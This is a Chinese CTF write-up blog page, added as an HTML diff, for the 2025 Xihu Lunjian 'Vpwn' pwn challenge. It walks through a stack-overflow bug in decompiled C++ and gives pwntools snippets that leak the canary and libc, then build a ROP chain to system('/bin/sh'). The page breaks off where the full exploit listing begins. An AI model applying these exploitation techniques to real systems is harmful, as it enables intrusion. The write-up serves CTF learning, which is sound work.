@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="downbeat">
+    
+    <meta name="author" content="D0wnBe@t">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+        
+        
+        
+            <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://downbeat.top/2025/01/20/2025西湖论剑wp-部分pwn和iot/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="诚挚感谢复现平台：https:&#x2F;&#x2F;gz.imxbt.cn&#x2F;  Vpwn一个简单的C++ pwn，用数组模拟栈的功能，但是存在溢出和任意修改。  先看一下主代码：  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657__int64 __fas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025西湖论剑wp-部分pwn和IOT">
+<meta property="og:url" content="http://downbeat.top/2025/01/20/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp-%E9%83%A8%E5%88%86pwn%E5%92%8CIOT/index.html">
+<meta property="og:site_name" content="D0wnBe@t">
+<meta property="og:description" content="诚挚感谢复现平台：https:&#x2F;&#x2F;gz.imxbt.cn&#x2F;  Vpwn一个简单的C++ pwn，用数组模拟栈的功能，但是存在溢出和任意修改。  先看一下主代码：  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657__int64 __fas">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://downbeat.top/image-20250120224301608.png">
+<meta property="og:image" content="http://downbeat.top/image-20250120225111355.png">
+<meta property="og:image" content="http://downbeat.top/image-20250121002148752.png">
+<meta property="og:image" content="http://downbeat.top/image-20250121002434862.png">
+<meta property="article:published_time" content="2025-01-20T14:32:04.000Z">
+<meta property="article:modified_time" content="2025-01-20T16:24:58.484Z">
+<meta property="article:author" content="downbeat">
+<meta property="article:tag" content="ctf-pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://downbeat.top/image-20250120224301608.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/favicon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2025西湖论剑wp-部分pwn和IOT | D0wnBe@t
+        
+    </title>
+
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fonts/Chillax/chillax.css">
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/assets/build/styles.css">
+    
+
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fonts/GeistMono/geist-mono.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fonts/Geist/geist.css">
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"300px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/Linux-user-Room.png","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Dream of Full Stack","subtitle":{"text":["keep going"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/8/20 11:51:58"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                D0wnBe@t
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">42</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">2025西湖论剑wp-部分pwn和IOT</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar2.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">D0wnBe@t</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-01-20 22:32:04</span>
+        <span class="mobile">2025-01-20 22:32:04</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-01-21 00:24:58</span>
+            <span class="mobile">2025-01-21 00:24:58</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf-pwn/">ctf-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.5k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>13 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>诚挚感谢复现平台：<a class="link" target="_blank" rel="noopener" href="https://gz.imxbt.cn/">https://gz.imxbt.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h1 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h1><p>一个简单的C++ pwn，用数组模拟栈的功能，但是存在溢出和任意修改。</p>
+<ul>
+<li>先看一下主代码：</li>
+</ul>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+8h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sub_1840</span>((__int64)v8);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;\nMenu:\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;1. Edit an element in the vector\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;2. Push a new element\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;3. Pop the last element\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;4. Print vector\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;5. Exit\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">    std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the index to edit (0-based): &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the new value: &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v6);</span><br><span class="line">        v3 = v6;</span><br><span class="line">        *(_DWORD *)<span class="built_in">check</span>(v8, v7) = v3;          <span class="comment">// 修改边界限制检查</span></span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Element updated successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the value to push: &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">        <span class="built_in">sub_18F4</span>(v8, &amp;v7);</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Element pushed successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">sub_1928</span>(v8);                           <span class="comment">// 仅将标志位设置为0</span></span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Last element popped successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">sub_19BC</span>(v8);                           <span class="comment">// show</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Exiting program.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Invalid choice! Please enter a valid option.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>大概操作比较简单，给了一个菜单，我们可以push,pop,edit,show和exit功能，我们看看push是如何实现的：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18F4</span><span class="params">(__int64 a1, <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *a2;</span><br><span class="line">  result = *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">24</span>) = result + <span class="number">1</span>;            <span class="comment">// 可溢出覆盖</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span> * result) = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>通过将数据放进a1所指向地址的一个偏移处，并且在 +24的位置设置了一个数据的个数，那么此处是存在覆盖的，因为a1也就是主函数里面的v8这个字节数组，是存在与栈上的，由于”栈”空间是储存在 +24这个固定偏移的地方，也就是说我们可以往栈上多写几个数据就可以覆盖”栈空间”了，下面具体看一下：</p>
+<h2 id="漏洞点调试"><a href="#漏洞点调试" class="headerlink" title="漏洞点调试"></a>漏洞点调试</h2><ul>
+<li>先push四个数字：1，2，3，4看看栈上的数据：</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250120224301608.png" alt="image-20250120224301608"></p>
+<ul>
+<li>可以明显发现，我们push第七个数据就会覆盖”栈空间”，由于此题保护全开，我们需要泄露canary和libc，也就是我们至少要泄露rbp+8那里指向的一个可以算出libc_base的地址(本机libc版本不同，所以栈上数据不一致，实际上libc.so里面也没有__libc_start_call_main),因此我们可以假设覆盖“栈空间为20.</li>
+<li>接着如何泄露canary和libc? 其实直接show就好了，我们打远程看看覆盖”栈空间”之后，show出来20个4字节的数据是什么(因为每个数据均是以unsigned int储存，输出也是，故为4字节)</li>
+</ul>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push(<span class="number">1</span>)</span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">3</span>)</span><br><span class="line">push(<span class="number">4</span>)</span><br><span class="line">push(<span class="number">5</span>)</span><br><span class="line">push(<span class="number">6</span>)</span><br><span class="line">push(<span class="number">20</span>) <span class="comment"># 造成溢出</span></span><br><span class="line"></span><br><span class="line">show() </span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250120225111355.png" alt="image-20250120225111355"></p>
+<p>对照着之前动调的栈空间，可以得到 <code>20 0 0 0 </code>之后的数据便是canary，两部分都是canary，一个是高位，一个是地位，但是注意到数据有负数，要将其转化为无符号整数，即：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span> :</span><br><span class="line">        n += <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏canary</span></span><br><span class="line">ru(<span class="string">&#x27;20 0 0 0 &#x27;</span>)</span><br><span class="line">canary_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">canary_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">canary_low = check(canary_low) <span class="comment"># 处理出现负数即无符号溢出的情况</span></span><br><span class="line">canary_high = check(canary_high)</span><br><span class="line"></span><br><span class="line">canary = (canary_high &lt;&lt; <span class="number">32</span>) | canary_low</span><br></pre></td></tr></table></figure></div>
+
+<p>同理，<code>0 0 0 0 2 0 </code>之后的数据便是可以泄露libc了，方法和canary是一致的：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_low = check(libc_low)</span><br><span class="line">libc_high = check(libc_high)</span><br><span class="line"></span><br><span class="line">libc_base = (libc_high &lt;&lt; <span class="number">32</span>) | libc_low</span><br><span class="line">libc.address = libc_base - <span class="number">0x29d90</span> <span class="comment"># 这个数据估计要patchelf之后动调才知道，但是c++的文件我还不会patchelf，后续再补上</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>接下来就是布置rop链就行了，但是注意，我们要在ret_addr地方布置，由于此时“栈空间”是20，直接push的话不是在ret_addr，所以还需要先pop两个数据出来，再布置rop链即可，注意每次push仅为4字节，那么很明显了：</li>
+</ul>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x0000000000029139</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只需修改ret_addr即可，将“stack&quot;退到ret_addr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造rop链,get shell</span></span><br><span class="line">push(pop_rdi_ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((pop_rdi_ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(bin_sh &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((bin_sh &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(system &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">exit() <span class="comment">#布置完rop链需停止程序，让程序去执行rop链</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 